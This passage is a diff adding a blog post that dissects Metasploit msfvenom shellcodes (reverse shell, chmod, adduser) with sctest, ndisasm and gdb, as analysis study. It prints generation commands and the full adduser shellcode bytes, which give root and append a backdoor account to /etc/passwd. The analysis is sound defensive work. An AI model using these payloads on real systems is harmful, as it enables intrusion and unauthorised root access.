+                 &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;long&lt;/span&gt; &lt;span class="n"&gt;s_addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;16843135&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mf"&gt;127.1.1.1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+             &lt;span class="p"&gt;};&lt;/span&gt;
+             &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;sin_zero&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;       &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+         &lt;span class="p"&gt;};&lt;/span&gt;
+     &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;addrlen&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;102&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;execve&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
+     &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;dateiname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x00416fa6&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; 
+           &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/bin//sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+     &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
+           &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x00416f9e&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; 
+               &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x00416fa6&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; 
+                   &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/bin//sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+           &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x00000000&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; 
+             &lt;span class="n"&gt;none&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+     &lt;span class="p"&gt;];&lt;/span&gt;
+     &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;envp&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x00000000&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; 
+         &lt;span class="n"&gt;none&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;At first glance I thought that &lt;code&gt;sctest&lt;/code&gt; reconstructed the whole program in C, but then quickly realized that it is just a C-like syntax. Nevertheless the job &lt;code&gt;sctest&lt;/code&gt; did in this department is amazing.&lt;/p&gt;
+&lt;p&gt;From the output above you can tell that at first the shellcode creates a socket with the &lt;code&gt;socket()&lt;/code&gt; function. Then it forwards process's standard input, output and error to that socket with several calls to &lt;code&gt;dup2()&lt;/code&gt; function. After that it initiates a connection to 127.1.1.1 address on port 4444 using &lt;code&gt;connect()&lt;/code&gt; function, just as we wanted it to. And finally it spawns the &lt;code&gt;/bin/sh&lt;/code&gt; shell using &lt;code&gt;execve()&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;As you can see using &lt;code&gt;sctest&lt;/code&gt; we were able to understand what the shellcode does without even disassembling it. But this is not always the case. Let's take a look at the next example.&lt;/p&gt;
+&lt;h1&gt;Example #2: Chmod&lt;/h1&gt;
+&lt;p&gt;As in the previous example I will pipe the generated shellcode into &lt;code&gt;sctest&lt;/code&gt;. This time it will be the chmod payload. All it does is modify Unix permissions on a file to, by default, 0666.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;msfvenom -p linux/x86/chmod &lt;span class="nv"&gt;FILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;tmp.bin -f raw &lt;span class="p"&gt;|&lt;/span&gt; /opt/libemu/bin/sctest -vvv -S -s &lt;span class="m"&gt;100000&lt;/span&gt; -G tmp.dot
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The &lt;code&gt;-G&lt;/code&gt; option supplied to the sctest command outputs a graph of shellcode logic in the dot file format, that can be further converted into an image using &lt;code&gt;dot&lt;/code&gt; utility. Looking at the depicted algorithm sometimes facilitates a better understanding of what's happening, especially when the shellcode extensively uses loops and branching.&lt;/p&gt;
+&lt;p&gt;After running the above command the high level output I got was this:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;ERROR&lt;/span&gt;  &lt;span class="n"&gt;chmod&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
+&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="n"&gt;ERROR&lt;/span&gt;  &lt;span class="n"&gt;exit&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
+     &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;4288522&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Looking at it I could tell that the shellcode probably calls the &lt;code&gt;chmod()&lt;/code&gt; and &lt;code&gt;exit()&lt;/code&gt; functions, but what parameters were passed to &lt;code&gt;chmod()&lt;/code&gt; is not clear. Let's take a look at the graph converted from dot to png file format:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;dot -Tpng -o tmp.png tmp.dot &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; eog tmp.png
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;img alt="Chmod shellcode call graph" src="http://unlim.xyz/images/dissecting-msfvenom-shellcodes/chmod-shellcode-call-graph.png" title="Chmod shellcode call graph" /&gt;
+&lt;div class="img-caption"&gt;Chmod shellcode call graph&lt;/div&gt;&lt;/p&gt;
+&lt;p&gt;On the call graph we can again see that &lt;code&gt;sctest&lt;/code&gt; definitely caught calls to the &lt;code&gt;chmod()&lt;/code&gt; and &lt;code&gt;exit()&lt;/code&gt; functions. We can also see that the second argument (ECX register) to the &lt;code&gt;chmod&lt;/code&gt; system call is set to &lt;em&gt;0x1b6&lt;/em&gt;, which, as we can confirm on Linux command line with &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nb"&gt;printf&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;%o\n&amp;quot;&lt;/span&gt; 0x1b6 
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;command translates into &lt;em&gt;666&lt;/em&gt; in the octal numeral system, which is the default permissions used by the shellcode. &lt;/p&gt;
+&lt;p&gt;Next, because of the call-pop instruction sequence we may suppose that the first argument to the &lt;code&gt;chmod()&lt;/code&gt; is probably set using the call-pop technique which is a modification of the venerable jmp-call-pop technique with data coming before the destination of call jump. The fact that the graph shows relative address of 0x1 as a call destination is odd and we'll have to use &lt;code&gt;ndisasm&lt;/code&gt; and &lt;code&gt;gdb&lt;/code&gt; to understand why it is so. But I reserved this activity to a similar problem in the last example that follows.&lt;/p&gt;
+&lt;p&gt;Also note that the above shellcode contains null bytes. That is because &lt;code&gt;msfvenom&lt;/code&gt; does not care about bad characters if you don't tell it to. And although I do not encrypt payloads in my examples here, note that &lt;code&gt;sctest&lt;/code&gt; can equally work its way through encrypted shellcodes.&lt;/p&gt;
+&lt;h1&gt;Example #3: Adduser&lt;/h1&gt;
+&lt;p&gt;In this example I want to zero in on the case where the &lt;code&gt;sctest&lt;/code&gt; is mostly useless and some interaction with &lt;code&gt;gdb&lt;/code&gt; is needed to fully see the shellcode through.&lt;/p&gt;
+&lt;p&gt;After running the following command,&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;msfvenom -p linux/x86/adduser -f raw &lt;span class="p"&gt;|&lt;/span&gt; /opt/libemu/bin/sctest -vvv -S -s &lt;span class="m"&gt;100000&lt;/span&gt; -G tmp.dot
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;you will see that &lt;code&gt;sctest&lt;/code&gt; was not able to generate a high view of the shellcode logic and even the tmp.dot call graph is empty.&lt;/p&gt;
+&lt;p&gt;Let's try a different approach and disassemble the shellcode with &lt;code&gt;ndisasm&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;msfvenom -p linux/x86/adduser -f raw &amp;gt; tmp.bin &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ndisasm -b32 tmp.bin
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Below is the output of the above command with my comments. I truncated the "gibberish" part to save some space.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;00000000&lt;/span&gt;  &lt;span class="err"&gt;31&lt;/span&gt;&lt;span class="nf"&gt;C9&lt;/span&gt;              &lt;span class="nv"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;ecx&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nv"&gt;zero&lt;/span&gt; &lt;span class="nv"&gt;out&lt;/span&gt; &lt;span class="nb"&gt;ECX&lt;/span&gt; &lt;span class="nv"&gt;and&lt;/span&gt; &lt;span class="nb"&gt;EBX&lt;/span&gt;
+&lt;span class="err"&gt;00000002&lt;/span&gt;  &lt;span class="err"&gt;89&lt;/span&gt;&lt;span class="nf"&gt;CB&lt;/span&gt;              &lt;span class="nv"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;ecx&lt;/span&gt;
+&lt;span class="err"&gt;00000004&lt;/span&gt;  &lt;span class="err"&gt;6&lt;/span&gt;&lt;span class="nf"&gt;A46&lt;/span&gt;              &lt;span class="nv"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x46&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nv"&gt;load&lt;/span&gt; &lt;span class="nb"&gt;EAX&lt;/span&gt; &lt;span class="nv"&gt;with&lt;/span&gt; &lt;span class="mh"&gt;0x46&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;corresponding&lt;/span&gt;
+&lt;span class="err"&gt;00000006&lt;/span&gt;  &lt;span class="err"&gt;58&lt;/span&gt;                &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;     &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nv"&gt;to&lt;/span&gt; &lt;span class="nv"&gt;setreuid&lt;/span&gt; &lt;span class="nv"&gt;syscall&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt;
+&lt;span class="err"&gt;00000007&lt;/span&gt;  &lt;span class="nf"&gt;CD80&lt;/span&gt;              &lt;span class="nv"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;0x80&lt;/span&gt;
+&lt;span class="err"&gt;00000009&lt;/span&gt;  &lt;span class="err"&gt;6&lt;/span&gt;&lt;span class="nf"&gt;A05&lt;/span&gt;              &lt;span class="nv"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x5&lt;/span&gt;  &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nv"&gt;load&lt;/span&gt; &lt;span class="nb"&gt;EAX&lt;/span&gt; &lt;span class="nv"&gt;with&lt;/span&gt; &lt;span class="nv"&gt;open&lt;/span&gt; &lt;span class="nv"&gt;syscall&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt;
+&lt;span class="err"&gt;0000000&lt;/span&gt;&lt;span class="nf"&gt;B&lt;/span&gt;  &lt;span class="mi"&gt;58&lt;/span&gt;                &lt;span class="nv"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+&lt;span class="err"&gt;0000000&lt;/span&gt;&lt;span class="nf"&gt;C&lt;/span&gt;  &lt;span class="mi"&gt;31&lt;/span&gt;&lt;span class="nv"&gt;C9&lt;/span&gt;              &lt;span class="nv"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;ecx&lt;/span&gt; 
+&lt;span class="err"&gt;0000000&lt;/span&gt;&lt;span class="nf"&gt;E&lt;/span&gt;  &lt;span class="mi"&gt;51&lt;/span&gt;                &lt;span class="nv"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;        &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nv"&gt;push&lt;/span&gt; &lt;span class="nv"&gt;some&lt;/span&gt; &lt;span class="nv"&gt;nulls&lt;/span&gt; &lt;span class="nv"&gt;to&lt;/span&gt; &lt;span class="nv"&gt;the&lt;/span&gt; &lt;span class="nv"&gt;stack&lt;/span&gt;
+&lt;span class="err"&gt;0000000&lt;/span&gt;&lt;span class="nf"&gt;F&lt;/span&gt;  &lt;span class="mi"&gt;6873737764&lt;/span&gt;        &lt;span class="nv"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="mh"&gt;0x64777373&lt;/span&gt;       &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nv"&gt;pushing&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="nv"&gt;passwd&lt;/span&gt;
+&lt;span class="err"&gt;00000014&lt;/span&gt;  &lt;span class="err"&gt;682&lt;/span&gt;&lt;span class="nf"&gt;F2F7061&lt;/span&gt;        &lt;span class="nv"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="mh"&gt;0x61702f2f&lt;/span&gt;       &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nv"&gt;string&lt;/span&gt; &lt;span class="nv"&gt;to&lt;/span&gt; &lt;span class="nv"&gt;the&lt;/span&gt; &lt;span class="nv"&gt;stack&lt;/span&gt;
+&lt;span class="err"&gt;00000019&lt;/span&gt;  &lt;span class="err"&gt;682&lt;/span&gt;&lt;span class="nf"&gt;F657463&lt;/span&gt;        &lt;span class="nv"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="mh"&gt;0x6374652f&lt;/span&gt;
+&lt;span class="err"&gt;0000001&lt;/span&gt;&lt;span class="nf"&gt;E&lt;/span&gt;  &lt;span class="mi"&gt;89&lt;/span&gt;&lt;span class="nv"&gt;E3&lt;/span&gt;              &lt;span class="nv"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;esp&lt;/span&gt;
+&lt;span class="err"&gt;00000020&lt;/span&gt;  &lt;span class="err"&gt;41&lt;/span&gt;                &lt;span class="nf"&gt;inc&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;     &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nb"&gt;ECX&lt;/span&gt; &lt;span class="nv"&gt;is&lt;/span&gt; &lt;span class="nv"&gt;now&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
+&lt;span class="err"&gt;00000021&lt;/span&gt;  &lt;span class="nf"&gt;B504&lt;/span&gt;              &lt;span class="nv"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ch&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0x4&lt;/span&gt;      &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nb"&gt;ECX&lt;/span&gt; &lt;span class="nv"&gt;is&lt;/span&gt; &lt;span class="nv"&gt;now&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1025&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;or&lt;/span&gt; &lt;span class="mi"&gt;2001&lt;/span&gt; &lt;span class="nv"&gt;in&lt;/span&gt; &lt;span class="nv"&gt;octal&lt;/span&gt;
+&lt;span class="err"&gt;00000023&lt;/span&gt;  &lt;span class="nf"&gt;CD80&lt;/span&gt;              &lt;span class="nv"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;0x80&lt;/span&gt;
+&lt;span class="err"&gt;00000025&lt;/span&gt;  &lt;span class="err"&gt;93&lt;/span&gt;                &lt;span class="nf"&gt;xchg&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;ebx&lt;/span&gt;
+&lt;span class="err"&gt;00000026&lt;/span&gt;  &lt;span class="nf"&gt;E828000000&lt;/span&gt;        &lt;span class="nv"&gt;call&lt;/span&gt; &lt;span class="kt"&gt;dword&lt;/span&gt; &lt;span class="mh"&gt;0x53&lt;/span&gt;
+&lt;span class="err"&gt;0000002&lt;/span&gt;&lt;span class="nf"&gt;B&lt;/span&gt;  &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="nv"&gt;D&lt;/span&gt;                &lt;span class="nv"&gt;insd&lt;/span&gt;            &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nv"&gt;gibberish&lt;/span&gt; &lt;span class="nv"&gt;begins&lt;/span&gt;
+&lt;span class="err"&gt;0000002&lt;/span&gt;&lt;span class="nf"&gt;C&lt;/span&gt;  &lt;span class="mi"&gt;657461&lt;/span&gt;            &lt;span class="nb"&gt;gs&lt;/span&gt; &lt;span class="nv"&gt;jz&lt;/span&gt; &lt;span class="mh"&gt;0x90&lt;/span&gt;
+&lt;span class="nf"&gt;......................................&lt;/span&gt;
+&lt;span class="err"&gt;00000052&lt;/span&gt;  &lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;A598B&lt;/span&gt;            &lt;span class="nv"&gt;or&lt;/span&gt; &lt;span class="nb"&gt;bl&lt;/span&gt;&lt;span class="p"&gt;,[&lt;/span&gt;&lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x75&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="err"&gt;00000055&lt;/span&gt;  &lt;span class="err"&gt;51&lt;/span&gt;                &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;
+&lt;span class="err"&gt;00000056&lt;/span&gt;  &lt;span class="nf"&gt;FC&lt;/span&gt;                &lt;span class="nb"&gt;cl&lt;/span&gt;&lt;span class="nv"&gt;d&lt;/span&gt;         &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nv"&gt;gibberish&lt;/span&gt; &lt;span class="nv"&gt;ends&lt;/span&gt;
+&lt;span class="err"&gt;00000057&lt;/span&gt;  &lt;span class="err"&gt;6&lt;/span&gt;&lt;span class="nf"&gt;A04&lt;/span&gt;              &lt;span class="nv"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x4&lt;/span&gt;  &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nv"&gt;load&lt;/span&gt; &lt;span class="nb"&gt;EAX&lt;/span&gt; &lt;span class="nv"&gt;with&lt;/span&gt; &lt;span class="nv"&gt;write&lt;/span&gt; &lt;span class="nv"&gt;syscall&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt;
+&lt;span class="err"&gt;00000059&lt;/span&gt;  &lt;span class="err"&gt;58&lt;/span&gt;                &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+&lt;span class="err"&gt;0000005&lt;/span&gt;&lt;span class="nf"&gt;A&lt;/span&gt;  &lt;span class="nv"&gt;CD80&lt;/span&gt;              &lt;span class="nv"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;0x80&lt;/span&gt;
+&lt;span class="err"&gt;0000005&lt;/span&gt;&lt;span class="nf"&gt;C&lt;/span&gt;  &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="nv"&gt;A01&lt;/span&gt;              &lt;span class="nv"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x1&lt;/span&gt;  &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nv"&gt;load&lt;/span&gt; &lt;span class="nb"&gt;EAX&lt;/span&gt; &lt;span class="nv"&gt;with&lt;/span&gt; &lt;span class="nv"&gt;exit&lt;/span&gt; &lt;span class="nv"&gt;syscall&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt;
+&lt;span class="err"&gt;0000005&lt;/span&gt;&lt;span class="nf"&gt;E&lt;/span&gt;  &lt;span class="mi"&gt;58&lt;/span&gt;                &lt;span class="nv"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+&lt;span class="err"&gt;0000005&lt;/span&gt;&lt;span class="nf"&gt;F&lt;/span&gt;  &lt;span class="nv"&gt;CD80&lt;/span&gt;              &lt;span class="nv"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;0x80&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Looking at the above disassembly and my comments you can tell that the shellcode:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Sets real and effective UID to 0 (gets root privileges)&lt;/li&gt;
+&lt;li&gt;Opens &lt;code&gt;/etc/passwd&lt;/code&gt; file&lt;/li&gt;
+&lt;li&gt;Writes something into it, and&lt;/li&gt;
+&lt;li&gt;Exits&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Knowing that the shellcode adds a user named &lt;em&gt;metasploit&lt;/em&gt; with the same password it is not difficult to guess what exactly is written to the &lt;code&gt;/etc/passwd&lt;/code&gt;. Knowing what exactly the shellcode does I actually ran it and sure enough found &lt;em&gt;metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh&lt;/em&gt; string inserted as a last thing in the file.&lt;/p&gt;
+&lt;p&gt;To decipher the syscall codes I used the &lt;code&gt;/usr/include/i386-linux-gnu/asm/unistd_32.h&lt;/code&gt; file where Linux x86 system calls are defined.&lt;/p&gt;
+&lt;p&gt;The 2001 octal number pushed to ECX represents file access mode flags. To understand what it means I looked into the &lt;code&gt;/usr/include/asm-generic/fcntl.h&lt;/code&gt; file, where &lt;code&gt;open()&lt;/code&gt; function flags are defined. 2001 represented a combination of &lt;code&gt;O_WRONLY&lt;/code&gt; (01) and &lt;code&gt;O_APPEND&lt;/code&gt; (02000) flags, which makes a perfect sense for the action the shellcode takes.&lt;/p&gt;
+&lt;p&gt;Now the interesting part. Note that the call instruction jumps to the 0x53 address. But then there is no separate instructions at that address. There is an instruction at the address 0x52 and then at 0x55. This fact indicates that in the "gibberish" part of the code some incorrect sequence of bytes confused the disassembler and the bytes-to-opcodes translation went off. &lt;/p&gt;
+&lt;p&gt;Note the sequence of bytes at the 0x52 address - 0A598B. The 53rd byte, where the &lt;code&gt;call&lt;/code&gt; instruction jumps is 59. I will regenerate payload in the C format, take the part starting from 53rd byte and disassemble it to get the correct bytes-to-opcodes translation. For that I will use the &lt;a href="https://github.com/reider-roque/reed/tree/master/tools"&gt;scdisas&lt;/a&gt; script that I created while going through the SLAE course materials.&lt;/p&gt;
+&lt;p&gt;Producing shellcode in the format ready to be pasted into a C program:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;msfvenom -p linux/x86/adduser -f c
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Output (truncated):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;...
+&amp;quot;\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51&amp;quot;
+&amp;quot;\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63&amp;quot;
+&amp;quot;\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x28\x00\x00\x00\x6d\x65&amp;quot;
+&amp;quot;\x74\x61\x73\x70\x6c\x6f\x69\x74\x3a\x41\x7a\x2f\x64\x49\x73&amp;quot;
+&amp;quot;\x6a\x34\x70\x34\x49\x52\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a&amp;quot;
+&amp;quot;\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58&amp;quot;
+&amp;quot;\xcd\x80\x6a\x01\x58\xcd\x80&amp;quot;;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Disassembling of the shellcode starting from 52nd byte:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;scdisas &lt;span class="s2"&gt;&amp;quot;\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Output:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;00000000  59                pop ecx
+00000001  8B51FC            mov edx,[ecx-0x4]
+00000004  6A04              push byte +0x4
+00000006  58                pop eax
+00000007  CD80              int 0x80
+00000009  6A01              push byte +0x1
+0000000B  58                pop eax
+0000000C  CD80              int 0x80
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;In the above output you can see that the instruction where call passes execution flow is pop instruction. And that means that the shellcode employed the variation of jmp-call-pop technique, as encountered in the previous example. So what I called "gibberish" is actually some kind of data, most likely a string, address to which gets loaded into ECX register. By now we already know what string it is, but just to make sure let's take a look at it in &lt;code&gt;gdb&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;To run the shellcode in &lt;code&gt;gdb&lt;/code&gt; I'll save it in the ELF format. The ELF format that &lt;code&gt;msfvenom&lt;/code&gt; outputs runs without any problems, but the binary is stripped of all symbols, which means that we won't be able to set a breakpoint on the &lt;em&gt;_start&lt;/em&gt; or &lt;em&gt;main&lt;/em&gt; labels. To find the entry point we can use the &lt;code&gt;readelf&lt;/code&gt; utility. One of the lines from its output will point us to the address in question:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;msfvenom -p linux/x86/adduser -f elf &amp;gt; tmp.elf
+chmod +x tmp.elf
+readelf --headers tmp.elf
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Output:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;...
+  Entry point address:               0x8048054
+...
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Below is the command sequence that gets us started with gdb:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;gdb tmp.elf
+&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nb"&gt;break&lt;/span&gt; *0x8048054
+&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; run
